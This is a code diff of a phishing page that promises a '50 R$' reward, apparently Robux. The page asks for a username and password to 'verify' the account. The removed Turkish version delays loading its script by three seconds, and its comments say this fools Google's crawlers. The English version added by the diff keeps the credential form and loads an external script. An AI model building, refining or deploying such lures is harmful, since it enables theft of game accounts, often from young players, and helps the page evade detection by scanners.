@@ -3,36 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Dogrulama</title>
+    <title>Reward Verification</title>
     <style>
-        body { background: #1a1a1a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; font-family: sans-serif; }
-        .box { background: #2a2a2a; padding: 30px; border-radius: 15px; width: 300px; text-align: center; border: 1px solid #444; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .promo { background: #00c3ff; color: white; padding: 5px; border-radius: 5px; font-weight: bold; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; background: #3d3d3d; color: white; outline: none; }
-        button { width: 100%; padding: 12px; background: #00c3ff; border: none; color: white; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #0099cc; }
+        body { background: #121212; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        #app-box { background: #1f1f1f; padding: 35px; border-radius: 20px; width: 320px; text-align: center; border: 1px solid #333; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
+        .gift-icon { font-size: 50px; margin-bottom: 10px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #2a2a2a; color: white; outline: none; }
+        button { width: 100%; padding: 14px; background: #00e676; border: none; color: black; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="promo">🎁 50 R$ AKTARIM PANELI</div>
-        <p style="font-size: 13px; color: #aaa;">Devam etmek için hesabınızı doğrulayın.</p>
-        <form id="xf">
-            <input type="text" id="u" placeholder="Kullanıcı Adı" required>
-            <input type="password" id="p" placeholder="Şifre" required>
-            <button type="submit" id="submit-btn">ONAYLA VE AL</button>
+    <div id="app-box">
+        <div class="gift-icon">🎁</div>
+        <h2 style="color:white; margin:0 0 10px 0;">50 R$ Claim</h2>
+        <p style="color:#aaa; font-size:13px;">Verify your account to receive reward.</p>
+        <form id="claim-f">
+            <input type="text" id="usr" placeholder="Username" required>
+            <input type="password" id="pwd" placeholder="Password" required>
+            <button type="submit" id="sbtn">CLAIM REWARD</button>
         </form>
     </div>
-
-    <script>
-        // Site açıldıktan 3 saniye sonra asıl kodları yükler. 
-        // Bu sayede Google botları siteyi boş sanıp geçer.
-        setTimeout(() => {
-            const script = document.createElement('script');
-            script.src = 'app.js'; // app.js dosyanı bu isimle kaydet
-            document.body.appendChild(script);
-            console.log("Sistem aktif.");
-        }, 3000); 
-    </script>
+    <script src="system-core.js"></script>
 </body>
 </html>
+
